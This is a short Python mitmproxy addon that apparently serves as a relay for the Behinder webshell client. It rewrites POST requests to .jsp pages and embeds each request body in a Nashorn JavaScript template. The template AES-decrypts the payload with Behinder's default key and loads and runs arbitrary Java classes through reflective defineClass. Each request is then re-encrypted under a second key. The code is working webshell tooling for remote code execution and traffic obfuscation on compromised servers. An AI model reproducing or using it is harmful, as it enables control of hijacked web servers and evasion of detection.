import mitmproxy
import mitmproxy.http
import mitmproxy.ctx as ctx
import json
import urllib.parse
from mitmproxy.log import ALERT
import logging
import base64
from Crypto.Cipher import AES
import hashlib
import base64
from Crypto.Util.Padding import unpad,pad
from Crypto.Random import get_random_bytes
import binascii

logger = logging.getLogger(__name__)

BehinderKey = "rebeyond"
SelfKey = "PadishahPadishah"

template='''try {
    load("nashorn:mozilla_compat.js");
} catch (e) {}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.javax.crypto);
importPackage(Packages.sun.misc);
importPackage(Packages.javax.crypto.spec);
function define(classBytes){
    var byteArray = Java.type("byte[]");
    var int = Java.type("int");
    var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(
        "defineClass",
        byteArray.class,
        int.class,
        int.class
    );
    defineClassMethod.setAccessible(true);
    var cc = defineClassMethod.invoke(
        Thread.currentThread().getContextClassLoader(),
        classBytes,
        0,
        classBytes.length
    );
    var ccc=cc.newInstance();
    ccc.equals(pageContext);

}
if (request.getMethod().equals("POST")){
    var k=new java.lang.String("%s");
    session.putValue("u",k);
    var c=Cipher.getInstance("AES/ECB/PKCS5Padding");
    c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
    // var s=request.getReader().readLine();
    var s="%s";
    var b=new BASE64Decoder().decodeBuffer(s);
    define(c.doFinal(b));
}'''

def AES_Encrypt(src:bytes, key:bytes)->str:
    cipher = AES.new(key,AES.MODE_ECB)
    raw = cipher.encrypt(pad(src,AES.block_size))
    b = base64.b64encode(raw).decode("utf8")
    return b

class Interceptor:  
    def __init__(self) -> None:
        pass
    def request(self, flow:mitmproxy.http.HTTPFlow):
        if flow.request.url.__contains__(".jsp") and str(flow.request.method).lower()=="post":
            c = flow.request.text
            p = ("%s" % template % (hashlib.md5(BehinderKey.encode('utf8')).hexdigest()[:16], c))
            p = AES_Encrypt(p.encode("utf8"), SelfKey.encode("utf8"))
            flow.request.text = p
            # logger.log(ALERT,("h=%s" % urllib.parse.quote(template % c))[:50])
    
    def response(self, flow:mitmproxy.http.HTTPFlow):
        pass


addons = [
    Interceptor()
]